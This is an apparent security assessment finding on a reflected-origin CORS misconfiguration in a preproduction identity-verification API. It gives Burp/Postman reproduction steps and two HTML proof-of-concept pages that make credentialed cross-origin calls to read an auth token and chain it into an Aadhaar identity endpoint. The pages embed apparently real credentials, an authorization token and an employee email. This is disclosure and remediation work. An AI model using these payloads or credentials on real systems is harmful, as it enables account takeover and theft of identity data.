# Cross Origin Resource Sharing

### **Vulnerable API:**

All

### **Severity:**

Medium

### **Description:**

While testing all the responses by the help POSTMAN and BURP SUITE, Access-Control-Allow-Origin was set to ‘origin’, hence this allowed an arbitrary user to intercept the request and add an extra ‘Origin’ header with a value of any random website like ‘[https://bing.com](https://bing.com)’. This can allow an attacker to steal sensitive information which is being parsed by JSON on the page.\


### **Steps:**

1. Open postman and set its proxy to burp suite. Load the API and forward the request. Make sure Burp Interceptor is ON.
2. Once you click on ‘SEND’ in POSTMAN you will be prompted in BURP for the request in the interceptor.
3. Move this request to Repeater and add an extra header in the request like. **Origin: https://bing.com**

![Checking CORS](https://lh4.googleusercontent.com/N7FgzoZhrwljrePLb\_4rfcmmL8M4GWRz4h4Zq9jDVoILVGYZtvhH\_9xRgDfGgZIzgZiY5y3pACnhjGuCVgzmYZwOegBNTUCSlj4uCZ03Q2KneksjYuU-OQnjzV3rB9FQ8YOipuTQ)

4\. As you can see that the response is reflecting our “ORIGIN” header, hence to exploit this follow the below HTML doc.\


```markup
<!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS POC Exploit</h2>
<h3>Extract SID</h3>
<div id="demo">
<button type="button" onclick="cors()">Exploit POST Based JSON CORS</button>
</div>
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = alert(this.responseText);
    }
  };
  xhttp.open("POST", "https://preproduction.signzy.tech/api/v2/patrons/login", true);
  xhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  xhttp.send(JSON.stringify({"username": "signzystaging","password" :"bhai"}));
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
</body>
</html>
```

\


6\. Saving and Running the file will result in running the script which leaks authToken to next API.\


![Exploit Of CORS](https://lh5.googleusercontent.com/WGZlNCllD\_qdbTeenkhM5FDq6Z2d0KT09ITQdlQywb5FDciKqqQsOgTzBC7yFcRP-e7I5ccWFmK\_ezw0TvL\_OeX\_8zlLuqfgSVHHXJM9B\_DGOR0BX3oy5j-Mjv9bThNoi1ENDrFr)

7\. As you can see that this information leak was on Authentication API, but this particular vulnerability is actually possible in all the API request , resulting in leak of sensitive information like Authentication  Token.\


8\. Now using this Token to make a call to another API like, Aadhar Identity. Below is the HTML POC for exploiting the CORS in it.

```markup
<!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS POC Exploit</h2>
<h3>Extract SID</h3>
<div id="demo">
<button type="button" onclick="cors()">Exploit POST Based JSON CORS</button>
</div>
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = alert(this.responseText);
    }
  };
  xhttp.open("POST", "https://preproduction.signzy.tech/api/v2/patrons/59536fbaec27fe12d4e9aa1d/identities", true);
  xhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  xhttp.setRequestHeader("Authorization" , "SCLuZTnn1gz1URGJwQn5iCbKhLPZxGBUb4rp8vGE1wg9P89btDDRsTBlW0vaNWkI");
  xhttp.send(JSON.stringify({"type": "aadhaar","email": "ankur.rand@signzy.com","callbackUrl": "https://www.w3schools.com","images": ["https://persist.signzy.tech/api/files/753841/download/vGPLo49NyHhbndrSgHRbtPcbwaOt1k45nefFi8AYZLKFgum0Ek.png","https://persist.signzy.tech/api/files/753842/download/Sy0JOzh9evtWL311cVirCuMmZU6oqwW1ZVruybHWP5aiksy5vw.png"]}));
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
</body>
</html>

```

![Calling another API using the Access Token](https://lh3.googleusercontent.com/pxgd-4G2rh1pyZOtJLoWea1o\_UcAjkwT0AtKcp6hwUhE\_Cw0LDYEwfeDi1tHe-WBz2IEcc4DAb-JrYDAulrl4ffbiHGRaaxq08uXVQ5eWOAfXGiHWYtMHFkS7KwllhdlxmO8b8O0)

9\. Now as you can see that using CORS in one of the API I was able to get access to another API, again with lots of sensitive information.

10\. All of the above steps can be used to extract information regarding another api.

### Impact:

Sensitive information leak due to CORS can be exploited.

### Solution:

Use of `Access-Control-Allow-Origin` should  be used only for the white listed domains, also we can define a function to cross check the referer header and the origin header.\
